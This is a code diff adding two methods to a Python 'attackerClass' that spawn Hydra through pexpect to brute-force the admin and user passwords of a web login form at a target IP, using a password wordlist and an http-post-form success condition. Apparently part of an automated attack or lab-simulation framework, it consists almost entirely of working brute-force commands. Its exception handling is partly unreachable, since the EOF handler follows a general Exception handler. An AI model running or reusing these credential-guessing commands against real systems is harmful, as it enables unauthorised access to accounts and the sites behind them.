@@ -756,6 +756,60 @@ class attackerClass(object):
 		except pexpect.EOF:
 			print("Files Succesfully Downloaded")
 			child.close()
+			
+	@staticmethod
+	def hydra_web_admin_login(args):
+		'''
+		Start Hydra and find username and password for IP address
+		If username and password found kill hydra
+		Execute collect data method
+		'''
+
+		ip = args["IP"]
+
+		try:
+			print("Hydra BruteForce On Webpage (Admin) Being Executed")
+			command = "hydra -l admin -P /home/ubuntu/Documents/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
+			child = pexpect.spawn(command)
+			time.sleep(30)
+			print("BruteForce Successfully Executed")
+			child.close()
+			attackerClass.kill_hydra()
+
+		except Exception as e:
+			print (str(e))
+			log.exception(e)
+
+		except pexpect.EOF:
+			print("BruteForce On Webpage (Admin) Executed")
+			child.close()
+
+	@staticmethod
+	def hydra_web_user_login(ip):
+		'''
+		Start Hydra and find username and password for IP address
+		If username and password found kill hydra
+		Execute collect data method
+		'''
+
+		#ip = args["IP"]
+
+		try:
+			print("Hydra BruteForce On Webpage (User) Being Executed")
+			command = "hydra -l user -P /home/ubuntu/Documents/passwords.txt {} http-post-form ""/index.php/component/users/?view=login&Itemid=106:tfUName=^USER^&tfUPass=^PASS^:S=logout"" -v -f".format(ip)
+			child = pexpect.spawn(command)
+			time.sleep(30)
+			print("BruteForce Successfully Executed")
+			child.close()
+			attackerClass.kill_hydra()
+
+		except Exception as e:
+			print (str(e))
+			log.exception(e)
+
+		except pexpect.EOF:
+			print("BruteForce On Webpage (User) Executed")
+			child.close()
 	"===================================================================WEB SERVER METHODS========================================================================="
 
 	"===================================================================DATA ACCSS METHODS========================================================================="
